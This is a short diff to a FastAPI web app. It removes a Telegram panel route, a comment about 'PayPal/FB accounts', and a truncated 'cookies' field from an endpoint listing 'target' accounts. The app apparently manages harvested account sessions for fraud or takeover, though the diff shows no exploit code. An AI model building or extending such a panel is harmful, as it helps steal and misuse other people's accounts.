@@ -92,14 +92,6 @@ async def serve_telegram():
     except Exception as e:
         return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)
 
-@app.get("/tg_panel", response_class=HTMLResponse)
-async def serve_tg_panel():
-    try:
-        with open("web_panel/templates/tg_panel.html", "r", encoding="utf-8") as f:
-            return HTMLResponse(content=f.read())
-    except Exception as e:
-        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)
-
 @app.get("/mini_panel/{token}", response_class=HTMLResponse)
 async def serve_mini_panel(token: str):
     d = db.load_data()
@@ -129,7 +121,6 @@ async def get_accounts():
         })
     return JSONResponse(content={"status": "success", "accounts": result})
 
-# 🚨 NAYA ENDPOINT: Paypal/FB accounts ke liye
 @app.get("/api/get_target_accounts")
 async def get_target_accounts():
     d = db.load_data()
@@ -141,7 +132,6 @@ async def get_target_accounts():
             "phone": acc.get("phone", "Unknown"),
             "status": acc.get("status", "unknown"),
             "time": acc.get("time", 0),
-            "cookies": acc.get("cookies", "")[:15] + "..."
         })
     return JSONResponse(content={"status": "success", "targets": result})
 
